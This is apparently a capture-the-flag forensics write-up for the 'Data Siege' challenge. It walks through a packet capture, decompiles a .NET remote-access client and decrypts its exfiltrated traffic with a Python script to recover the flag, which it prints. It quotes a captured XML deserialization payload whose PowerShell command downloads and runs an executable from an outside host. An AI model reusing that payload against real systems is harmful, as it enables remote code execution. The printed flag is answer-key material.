---
layout: load_md
title: The White Circle | Cyber Apocalypse 2024 | Data Siege Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2024
parent: cyber_apocalypse_2024
category: forensics
challenge: Data Siege
tags: "forensics, twh, pcap, powershell, tshark, dotnet, python, aes, encryption"
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2024</h1>

## Data Siege
> Solved by : thewhiteh4t

```
We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.
```

- We need to look for exfiltrated data
- flag is split in three parts
- We have a PCAP file
- After analysis we can find an interesting frame :

```xml
    GET /nBISC4YJKs7j4I HTTP/1.1
    Cache-Control: no-cache
    Pragma: no-cache
    User-Agent: Java/11.0.19
    Host: 10.10.10.21:8080
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Connection: keep-alive
    
    HTTP/1.1 200 OK
    Content-Type: application/xml
    Connection: Keep-Alive
    Pragma: no-cache
    Server: Apache
    Content-Length: 651
    
    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="WHgLtpJX" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg>
        <list>
          <value>cmd.exe</value>
          <value>/c</value>
          <value><![CDATA[powershell Invoke-WebRequest 'http://10.10.10.21:8000/aQ4caZ.exe' -OutFile 'C:\temp\aQ4caZ.exe'; Start-Process 'c:\temp\aQ4caZ.exe']]></value>
        </list>
      </constructor-arg>
    </bean>
    </beans>
```

- Command execution where its downloading an `exe` file and running it with `PowerShell`
- Next thing we can extract the exe by exporting HTTP objects
- It’s a .NET executable so it can be decompiled easily using https://www.decompiler.com/
- EZRAClient/Program.cs
```c#
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
    {
        86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
        116, 95, 83
    });
    
    Very_S3cr3t_S
```
- Converting ASCII values to text gives us an interesting string, this is the IV for AES
- multiple TCP packets have data field which contain encrypted strings which can be extracted using `tshark` :

```
> tshark -T fields -e data -r capture.pcap > data.txt
```

- Now let’s look at decryption process
- `EZRATclient.Utils/Constantes.cs` contains the encryption key

`private static string _encryptKey = "VYAemVeO3zUDTL6N62kVA";`

- Decrypt function is present in `Program.cs` :

```c#
    public static string Decrypt(string cipherText)
            {
                    try
                    {
                            string encryptKey = Constantes.EncryptKey;
                            byte[] array = Convert.FromBase64String(cipherText);
                            using (Aes aes = Aes.Create())
                            {
                                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
                                    {
                                            86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
                                            116, 95, 83
                                    });
                                    aes.Key = rfc2898DeriveBytes.GetBytes(32);
                                    aes.IV = rfc2898DeriveBytes.GetBytes(16);
                                    using MemoryStream memoryStream = new MemoryStream();
                                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                                    {
                                            cryptoStream.Write(array, 0, array.Length);
                                            cryptoStream.Close();
                                    }
                                    cipherText = Encoding.Default.GetString(memoryStream.ToArray());
                            }
                            return cipherText;
                    }
                    catch (Exception ex)
                    {
                            Console.WriteLine(ex.Message);
                            Console.WriteLine("Cipher Text: " + cipherText);
                            return "error";
                    }
            }
```

- We have the IV and encryption key, python script for decryption :

```python
    #!/usr/bin/env python3
    
    import binascii
    from base64 import b64decode
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    
    with open('data.txt') as datafile:
            hex_lines = datafile.readlines()
    
    
    def derive_key_and_iv(password, salt):
            key_iv_bytes = PBKDF2(password, salt, dkLen=48)
            key = key_iv_bytes[:32]
            iv = key_iv_bytes[32:]
            return key, iv
    
    
    encryption_key = "VYAemVeO3zUDTL6N62kVA"
    salt = 'Very_S3cr3t_S'
    key, iv = derive_key_and_iv(encryption_key.encode(), salt)
    
    
    def decrypt(cipher_text, key, iv):
            cipher_text = b64decode(cipher_text)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decoded_msg = unpad(cipher.decrypt(cipher_text), AES.block_size).decode()
            return decoded_msg
    
    
    for hex_line in hex_lines:
            if len(hex_line) > 3:
                    enc_cipher_text = binascii.unhexlify(hex_line.strip()).replace(b'24\xa7', b'').replace(b'88\xa7', b'').replace(b'44\xa7', b'').replace(b'64\xa7', b'').replace(b'620\xa7', b'')
                    # print('-->', binascii.unhexlify(hex_line.strip()))
                    try:
                            print(decrypt(enc_cipher_text, key, iv))
                    except Exception:
                            pass
```

![](https://i.imgur.com/tSmJrRQ.png)


- We get first and second parts of the flag in the decrypted data :
```
-> HTB{c0mmun1c4710n5
-> _h45_b33n_r357
```
- Third part was easier as its present in the PCAP
- One of the frames is not encrypted and its a `PowerShell` command :


![](https://i.imgur.com/pY3xCRo.png)

- We can decode the payload to get the third part of the flag


![](https://i.imgur.com/SZX8tPa.png)

```
-> HTB{c0mmun1c4710n5
-> _h45_b33n_r357
-> 0r3d_1n_7h3_h34dqu4r73r5}

HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}
```

